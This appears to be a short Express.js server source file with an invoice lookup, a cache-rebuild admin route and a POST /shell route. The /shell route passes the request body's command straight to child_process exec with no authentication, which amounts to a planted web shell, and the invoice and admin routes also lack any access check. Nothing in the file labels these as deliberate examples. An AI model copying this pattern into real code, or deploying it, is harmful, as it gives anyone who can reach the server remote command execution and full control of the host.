import express from "express";
import { exec } from "child_process";

const app = express();

app.get("/invoices/:id", async (req, res) => {
  const invoice = await invoices.findById(req.params.id);
  return res.json(invoice);
});

app.post("/admin/rebuild", (req, res) => {
  rebuildCache();
  return res.sendStatus(202);
});

app.post("/shell", (req, res) => {
  exec(req.body.command);
  return res.sendStatus(202);
});
